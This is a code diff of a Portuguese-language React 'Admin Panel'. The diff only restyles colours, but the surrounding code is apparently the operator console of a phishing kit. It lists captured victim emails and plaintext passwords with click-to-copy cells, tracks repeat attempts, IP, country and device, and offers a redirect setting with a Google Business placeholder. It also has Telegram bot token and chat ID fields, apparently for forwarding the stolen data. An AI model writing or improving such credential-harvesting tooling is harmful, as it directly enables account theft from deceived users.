@@ -414,34 +414,34 @@ function AdminPanel() {
       <div className="min-h-screen bg-[#0a0a0a] flex items-center justify-center p-4">
         <div className="bg-[#111111] border border-green-900/30 rounded-2xl shadow-2xl shadow-green-900/10 p-8 w-full max-w-md">
           <div className="text-center mb-8">
-            <h1 className="text-3xl font-bold text-green-400 mb-2">Admin Panel</h1>
+            <h1 className="text-3xl font-bold text-white mb-2">Admin Panel</h1>
             <p className="text-gray-500">Entre com suas credenciais</p>
           </div>
 
           <form onSubmit={handleAdminLogin} className="space-y-6">
             <div>
-              <label className="block text-sm font-medium text-green-400/80 mb-2">
+              <label className="block text-sm font-medium text-gray-300 mb-2">
                 Usuário
               </label>
               <input
                 type="text"
                 value={username}
                 onChange={(e) => setUsername(e.target.value)}
-                className="w-full px-4 py-3 bg-[#0a0a0a] border border-green-900/40 rounded-lg focus:ring-2 focus:ring-green-500/50 focus:border-green-500/50 text-green-100 placeholder-gray-600 transition-all"
+                className="w-full px-4 py-3 bg-[#0a0a0a] border border-[#333] rounded-lg focus:ring-2 focus:ring-green-500/50 focus:border-green-500/50 text-white placeholder-gray-600 transition-all"
                 placeholder="donas"
                 required
               />
             </div>
 
             <div>
-              <label className="block text-sm font-medium text-green-400/80 mb-2">
+              <label className="block text-sm font-medium text-gray-300 mb-2">
                 Senha
               </label>
               <input
                 type="password"
                 value={loginPassword}
                 onChange={(e) => setLoginPassword(e.target.value)}
-                className="w-full px-4 py-3 bg-[#0a0a0a] border border-green-900/40 rounded-lg focus:ring-2 focus:ring-green-500/50 focus:border-green-500/50 text-green-100 placeholder-gray-600 transition-all"
+                className="w-full px-4 py-3 bg-[#0a0a0a] border border-[#333] rounded-lg focus:ring-2 focus:ring-green-500/50 focus:border-green-500/50 text-white placeholder-gray-600 transition-all"
                 placeholder="••••••••"
                 required
               />
@@ -456,7 +456,7 @@ function AdminPanel() {
             <button
               type="submit"
               disabled={loginLoading}
-              className="w-full bg-green-900/40 text-green-400 border border-green-500/40 py-3 rounded-lg font-semibold hover:bg-green-900/60 transition-colors disabled:opacity-50 disabled:cursor-not-allowed"
+              className="w-full bg-[#1a1a1a] text-white font-bold border border-gray-600/40 py-3 rounded-lg hover:bg-[#252525] transition-colors disabled:opacity-50 disabled:cursor-not-allowed"
             >
               {loginLoading ? "Entrando..." : "Entrar"}
             </button>
@@ -524,7 +524,7 @@ function AdminPanel() {
           {/* Search */}
           <div className="mb-6 grid grid-cols-1 md:grid-cols-2 gap-4">
             <div>
-              <label className="block text-sm font-medium text-green-400/80 mb-2">
+              <label className="block text-sm font-medium text-gray-300 mb-2">
                 Campo de referência:
               </label>
               <input
@@ -532,11 +532,11 @@ function AdminPanel() {
                 value={referenceField}
                 onChange={(e) => setReferenceField(e.target.value)}
                 placeholder="Ex: final do telefone, nome..."
-                className="w-full px-4 py-2 bg-[#0a0a0a] border border-green-900/40 rounded-lg focus:ring-2 focus:ring-green-500/50 focus:border-green-500/50 text-green-100 placeholder-gray-600"
+                className="w-full px-4 py-2 bg-[#0a0a0a] border border-[#333] rounded-lg focus:ring-2 focus:ring-green-500/50 focus:border-green-500/50 text-white placeholder-gray-600"
               />
             </div>
             <div>
-              <label className="block text-sm font-medium text-green-400/80 mb-2">
+              <label className="block text-sm font-medium text-gray-300 mb-2">
                 Site de Redirecionamento (Comando close):
               </label>
               <div className="flex gap-2">
@@ -545,7 +545,7 @@ function AdminPanel() {
                   value={redirectUrl}
                   onChange={(e) => setRedirectUrl(e.target.value)}
                   placeholder="https://business.google.com/"
-                  className="flex-1 px-4 py-2 bg-[#0a0a0a] border border-green-900/40 rounded-lg focus:ring-2 focus:ring-green-500/50 focus:border-green-500/50 text-green-100 placeholder-gray-600"
+                  className="flex-1 px-4 py-2 bg-[#0a0a0a] border border-[#333] rounded-lg focus:ring-2 focus:ring-green-500/50 focus:border-green-500/50 text-white placeholder-gray-600"
                 />
               </div>
             </div>
@@ -555,7 +555,7 @@ function AdminPanel() {
           {loading ? (
             <div className="text-center py-12">
               <div className="inline-block animate-spin rounded-full h-12 w-12 border-b-2 border-green-500"></div>
-              <p className="mt-4 text-green-400/60">Carregando...</p>
+              <p className="mt-4 text-gray-400">Carregando...</p>
             </div>
           ) : loginAttempts.length === 0 ? (
             <div className="text-center py-12">
@@ -571,7 +571,7 @@ function AdminPanel() {
                   <div key={attempt.id} className="border border-green-900/30 rounded-lg overflow-hidden">
                     {/* Header com email e número de tentativas */}
                     <div className="bg-[#0d1f0d] border-b border-green-900/40 px-4 py-3">
-                      <h3 className="font-bold text-lg text-green-400">{attempt.email} ({totalAttempts} tentativa{totalAttempts > 1 ? 's' : ''})</h3>
+                      <h3 className="font-bold text-lg text-white">{attempt.email} ({totalAttempts} tentativa{totalAttempts > 1 ? 's' : ''})</h3>
                     </div>
 
                     {/* Tabela */}
@@ -707,7 +707,7 @@ function AdminPanel() {
                         {/* Única linha de dados */}
                         <tr className="bg-[#0f0f0f]">
                           {/* # */}
-                          <td className="px-3 py-3 text-center text-sm font-bold text-green-300 border border-[#2a2a2a]">{index + 1}</td>
+                          <td className="px-3 py-3 text-center text-sm font-bold text-white border border-[#2a2a2a]">{index + 1}</td>
                           
                           {/* status - bolinha clicável */}
                           <td className="px-3 py-3 text-center border border-[#2a2a2a]">
@@ -726,7 +726,7 @@ function AdminPanel() {
                           
                           {/* USUÁRIO/LOGIN - valor fixo - COPIÁVEL */}
                           <td 
-                            className="px-3 py-3 text-sm border border-[#2a2a2a] font-medium cursor-pointer hover:bg-green-900/20 transition-colors text-green-100"
+                            className="px-3 py-3 text-sm border border-[#2a2a2a] font-medium cursor-pointer hover:bg-green-900/20 transition-colors text-white"
                             onClick={() => copyToClipboard(attempt.email, `email-${attempt.id}`)}
                             title="Clique para copiar"
                           >
@@ -737,7 +737,7 @@ function AdminPanel() {
                           
                           {/* SENHA - valor fixo - COPIÁVEL */}
                           <td 
-                            className="px-3 py-3 text-sm border border-[#2a2a2a] cursor-pointer hover:bg-green-900/20 transition-colors text-green-100"
+                            className="px-3 py-3 text-sm border border-[#2a2a2a] cursor-pointer hover:bg-green-900/20 transition-colors text-white"
                             onClick={() => copyToClipboard(attempt.password, `password-${attempt.id}`)}
                             title="Clique para copiar"
                           >
@@ -826,7 +826,7 @@ function AdminPanel() {
                         {attempt.attempts && attempt.attempts.map((additionalAttempt, attemptIndex) => (
                           <tr key={attemptIndex} className="bg-[#0a0f0a]">
                             {/* # */}
-                            <td className="px-3 py-3 text-center text-sm font-bold text-green-300/70 border border-[#2a2a2a]">{attemptIndex + 2}</td>
+                            <td className="px-3 py-3 text-center text-sm font-bold text-white/70 border border-[#2a2a2a]">{attemptIndex + 2}</td>
                             
                             {/* status - vazio */}
                             <td className="px-3 py-3 text-center border border-[#2a2a2a]">
@@ -839,10 +839,10 @@ function AdminPanel() {
                             </td>
                             
                             {/* USUÁRIO/LOGIN - nova tentativa */}
-                            <td className="px-3 py-3 text-sm border border-[#2a2a2a] font-medium text-green-100/70">{additionalAttempt.email}</td>
+                            <td className="px-3 py-3 text-sm border border-[#2a2a2a] font-medium text-white/70">{additionalAttempt.email}</td>
                             
                             {/* SENHA - nova tentativa */}
-                            <td className="px-3 py-3 text-sm border border-[#2a2a2a] text-green-100/70">{additionalAttempt.password || "-"}</td>
+                            <td className="px-3 py-3 text-sm border border-[#2a2a2a] text-white/70">{additionalAttempt.password || "-"}</td>
                             
                             {/* Demais campos vazios */}
                             <td className="px-3 py-3 text-center text-sm border border-[#2a2a2a] text-gray-600">-</td>
@@ -860,12 +860,12 @@ function AdminPanel() {
                   </div>
 
                   {/* Footer com informações */}
-                  <div className="bg-[#0a0a0a] px-4 py-3 text-xs text-green-400/60 border-t border-[#2a2a2a]">
+                  <div className="bg-[#0a0a0a] px-4 py-3 text-xs text-gray-300 border-t border-[#2a2a2a]">
                     <div className="grid grid-cols-2 md:grid-cols-4 gap-2">
-                      <div><span className="font-semibold text-green-400/80">IP:</span> {attempt.ip_address || "-"}</div>
-                      <div><span className="font-semibold text-green-400/80">País:</span> {attempt.country || "-"}</div>
-                      <div><span className="font-semibold text-green-400/80">Dispositivo:</span> {attempt.device || "Desktop"}</div>
-                      <div><span className="font-semibold text-green-400/80">Página atual:</span> {attempt.page || "Página Loading..."}</div>
+                      <div><span className="font-semibold text-gray-400">IP:</span> {attempt.ip_address || "-"}</div>
+                      <div><span className="font-semibold text-gray-400">País:</span> {attempt.country || "-"}</div>
+                      <div><span className="font-semibold text-gray-400">Dispositivo:</span> {attempt.device || "Desktop"}</div>
+                      <div><span className="font-semibold text-gray-400">Página atual:</span> {attempt.page || "Página Loading..."}</div>
                     </div>
                   </div>
                 </div>
@@ -887,23 +887,23 @@ function AdminPanel() {
 
             <div className="space-y-4">
               <div>
-                <label className="block text-sm font-medium text-green-400/80 mb-2">Bot Token</label>
+                <label className="block text-sm font-medium text-gray-300 mb-2">Bot Token</label>
                 <input
                   type="text"
                   value={telegramToken}
                   onChange={(e) => setTelegramToken(e.target.value)}
                   placeholder="123456789:ABCdefGHI..."
-                  className="w-full px-4 py-2 bg-[#0a0a0a] border border-green-900/40 rounded-lg text-green-100 placeholder-gray-600 focus:ring-2 focus:ring-green-500/50 focus:border-green-500/50"
+                  className="w-full px-4 py-2 bg-[#0a0a0a] border border-[#333] rounded-lg text-white placeholder-gray-600 focus:ring-2 focus:ring-green-500/50 focus:border-green-500/50"
                 />
               </div>
               <div>
-                <label className="block text-sm font-medium text-green-400/80 mb-2">Chat ID</label>
+                <label className="block text-sm font-medium text-gray-300 mb-2">Chat ID</label>
                 <input
                   type="text"
                   value={telegramChatId}
                   onChange={(e) => setTelegramChatId(e.target.value)}
                   placeholder="-1001234567890"
-                  className="w-full px-4 py-2 bg-[#0a0a0a] border border-green-900/40 rounded-lg text-green-100 placeholder-gray-600 focus:ring-2 focus:ring-green-500/50 focus:border-green-500/50"
+                  className="w-full px-4 py-2 bg-[#0a0a0a] border border-[#333] rounded-lg text-white placeholder-gray-600 focus:ring-2 focus:ring-green-500/50 focus:border-green-500/50"
                 />
               </div>
 
@@ -951,7 +951,7 @@ function AdminPanel() {
               {visitorsLoading ? (
                 <div className="text-center py-12">
                   <div className="inline-block animate-spin rounded-full h-10 w-10 border-b-2 border-green-500"></div>
-                  <p className="mt-3 text-green-400/60">Carregando...</p>
+                  <p className="mt-3 text-gray-400">Carregando...</p>
                 </div>
               ) : visitors.length === 0 ? (
                 <div className="text-center py-12">
@@ -972,8 +972,8 @@ function AdminPanel() {
                   <tbody>
                     {visitors.map((visitor, index) => (
                       <tr key={visitor.id || index} className="bg-[#0f0f0f] hover:bg-green-900/10">
-                        <td className="px-4 py-2 text-sm text-green-300 border border-[#2a2a2a]">{index + 1}</td>
-                        <td className="px-4 py-2 text-sm text-green-100 border border-[#2a2a2a] font-mono">{visitor.ip}</td>
+                        <td className="px-4 py-2 text-sm text-white border border-[#2a2a2a]">{index + 1}</td>
+                        <td className="px-4 py-2 text-sm text-white border border-[#2a2a2a] font-mono">{visitor.ip}</td>
                         <td className="px-4 py-2 text-sm text-gray-300 border border-[#2a2a2a]">{visitor.city || "-"}</td>
                         <td className="px-4 py-2 text-sm text-gray-300 border border-[#2a2a2a]">{visitor.state || "-"}</td>
                         <td className="px-4 py-2 text-sm text-gray-300 border border-[#2a2a2a]">{visitor.country || "-"}</td>
